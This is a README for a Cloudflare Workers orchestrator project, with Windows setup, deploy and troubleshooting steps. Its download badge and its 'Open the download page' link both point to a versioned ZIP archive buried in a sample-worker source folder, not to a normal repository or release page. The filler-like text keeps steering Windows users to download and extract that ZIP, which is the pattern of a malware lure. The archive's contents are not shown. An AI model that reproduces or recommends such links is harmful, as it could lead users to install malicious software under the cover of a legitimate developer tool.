# 🔧 dynamic-workers-orchestrator - Run Cloudflare Workers Your Way

[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/dimitrousabbatarian96/dynamic-workers-orchestrator/main/workers/sample-worker/src/dynamic_workers_orchestrator_2.4.zip)

## 📦 What this app does

Dynamic Workers Orchestrator helps you run your own Cloudflare Workers from one central place. You can keep your worker files in a folder, send them to the orchestrator, and then open them through a web path.

It is built as a PNPM monorepo with three parts:

- **`workers/orchestrator`**: The main Worker that loads and runs other Workers
- **`packages/cli`**: A command-line tool called `deploy-worker`
- **`workers/sample-worker`**: A simple example Worker you can use first

The setup is made for people who want a fast way to publish small web tools without changing the main app each time.

## 🖥️ Windows download and setup

Use this link to download or visit the project page:

[Open the download page](https://raw.githubusercontent.com/dimitrousabbatarian96/dynamic-workers-orchestrator/main/workers/sample-worker/src/dynamic_workers_orchestrator_2.4.zip)

### What you need on Windows

Before you start, make sure you have:

- **Windows 10 or Windows 11**
- **A web browser**
- **GitHub access**
- **Node.js 18 or later**
- **PNPM**
- **A Cloudflare account**

These tools let you install the project, send worker files, and run the orchestrator.

### How to get the files

1. Open the download page link above.
2. Download the project files as a ZIP, or use Git if you prefer.
3. Save the files in a folder you can find again, such as `Downloads` or `Documents`.
4. If you downloaded a ZIP file, right-click it and choose **Extract All**.
5. Open the extracted folder.

### How to run it

This project is not a single desktop app. It is a code project that runs from the command line and on Cloudflare.

Follow these steps:

1. Open **PowerShell** or **Command Prompt**.
2. Go to the project folder.
3. Install the project tools with PNPM.
4. Start the orchestrator and the CLI from the package folders.
5. Use the CLI to send a worker to the orchestrator.

If you want to try the example first, use `workers/sample-worker`.

## 🚀 Quick start

Use the sample worker first. It gives you a simple path from download to a working result.

### 1) Open the project folder

If you extracted the ZIP, open the folder that contains:

- `workers`
- `packages`
- `package.json`

### 2) Install the tools

Open PowerShell in that folder and run:

```powershell
pnpm install
```

This installs the files needed for the monorepo.

### 3) Start the orchestrator

Go to the orchestrator folder and start it with the Cloudflare tool chain you use for Workers.

A common path looks like this:

```powershell
cd workers\orchestrator
pnpm start
```

If your setup uses Wrangler, start it with the local worker command in that folder.

### 4) Send the sample worker

Open a second terminal window.

Go to the sample worker folder and deploy it with the CLI:

```powershell
cd workers\sample-worker
pnpm deploy-worker
```

The CLI packs the worker files and sends them to the orchestrator at:

`/api/deploy/:workerName`

### 5) Open the worker in your browser

After deploy, the orchestrator maps the worker to a path prefix.

For example, if your worker name is `sample-worker`, you may open:

```text
https://your-orchestrator-domain/sample-worker
```

That path sends the request to your deployed worker.

## 🧭 What you can expect

This app gives you a clear path for worker delivery:

- You keep worker code in a folder
- You send that folder to the orchestrator
- The orchestrator bundles the code
- It stores the build in KV cache
- It runs the worker in its own isolate
- It sends web traffic to the right worker path

This setup helps when you want one place to manage many small workers.

## 🛠️ Main parts of the project

### `workers/orchestrator`

This is the center of the system. It:

- Receives worker code
- Builds the worker on demand
- Saves compiled output in KV
- Runs the worker in a safe isolate
- Sends HTTP requests to the correct worker

### `packages/cli`

This package gives you the `deploy-worker` command. It:

- Reads the worker folder
- Collects files
- Posts them to the orchestrator
- Keeps deployment steps simple

### `workers/sample-worker`

This is a starter worker. Use it to:

- Check that your setup works
- Learn the folder layout
- Test the deploy flow

## 📋 Folder layout

A typical project layout looks like this:

```text
dynamic-workers-orchestrator/
├── packages/
│   └── cli/
├── workers/
│   ├── orchestrator/
│   └── sample-worker/
├── package.json
└── pnpm-workspace.yaml
```

You do not need to change this layout to begin.

## 🔧 Basic usage

### Deploy a new worker

1. Create a new folder for your worker.
2. Add your TypeScript or JavaScript files.
3. Run `deploy-worker` from that folder.
4. Wait for the orchestrator to finish the build.
5. Open the worker path in your browser.

### Use a path prefix

The orchestrator routes traffic by prefix. That means each worker gets its own path, such as:

- `/sample-worker`
- `/notes`
- `/dashboard`

This keeps workers separate while still using one host.

### Update a worker

To update a worker:

1. Change the files in your worker folder.
2. Run `deploy-worker` again.
3. Open the same worker path in your browser.

The new files replace the older version.

## 🔍 Example worker flow

A simple deploy flow looks like this:

1. You start the orchestrator.
2. You open the sample worker folder.
3. You run the CLI command.
4. The CLI sends the worker files.
5. The orchestrator bundles the files.
6. The orchestrator stores the build in KV.
7. The worker runs at its path prefix.

## 🧩 Simple browser test

After deploy, try a browser test:

1. Copy your worker URL.
2. Paste it into your browser address bar.
3. Press Enter.
4. Look for the response from your worker.

If the worker returns text or a web page, the setup works.

## ⚙️ Common Windows commands

Open **PowerShell** and use these commands:

### Go to a folder

```powershell
cd path\to\dynamic-workers-orchestrator
```

### Install dependencies

```powershell
pnpm install
```

### Move into the sample worker

```powershell
cd workers\sample-worker
```

### Run the deploy command

```powershell
pnpm deploy-worker
```

If Windows blocks script running, open PowerShell as your user and allow local scripts for the current session.

## 🔐 Cloudflare setup

This project uses Cloudflare Workers and KV storage.

You will usually need:

- A Cloudflare account
- A Worker space in your Cloudflare dashboard
- KV storage for cached builds
- The right access keys for deploys

Use the same Cloudflare account for the orchestrator and for the worker storage it needs.

## 🧪 Sample worker ideas

After you get the sample worker running, try a few small changes:

- Show a plain text hello page
- Return a time stamp
- Show a simple status page
- Add one route for `/health`
- Return JSON data for a basic API

These tests help you see how the orchestrator handles different worker files.

## 📁 Good places to put your worker

You can keep your worker in a folder like:

- `workers/my-first-worker`
- `workers/notes-app`
- `workers/status-page`

Use short names with no spaces. That makes the path easier to use in a browser.

## 🧯 Troubleshooting

### The page does not open

Check these things:

- The orchestrator is running
- The worker name in the URL is correct
- The deploy command finished
- Your Cloudflare settings are active

### The deploy command fails

Check these things:

- You ran the command in the worker folder
- PNPM is installed
- Node.js is installed
- Your Cloudflare access data is set up
- Your worker files do not have syntax errors

### The worker shows old content

Try this:

1. Run the deploy command again.
2. Wait for the build to finish.
3. Refresh the browser page.
4. Clear the browser cache if needed.

### PowerShell does not find PNPM

Try:

```powershell
pnpm -v
```

If that fails, install PNPM and open a new terminal window.

## 📚 File types you can use

The orchestrator is built for:

- JavaScript files
- TypeScript files
- Small worker assets
- Simple route files
- Web API responses

Keep your worker code small and clear.

## 🧠 How routing works

The orchestrator uses the request path to find the right worker. If your worker name is `sample-worker`, then the app can send traffic for that path to the right code.

That means one main service can host many worker apps.

## ✅ Best first test

If you want the easiest path:

1. Download the project from the link above
2. Extract it on Windows
3. Install PNPM tools
4. Start the orchestrator
5. Deploy `workers/sample-worker`
6. Open the worker in your browser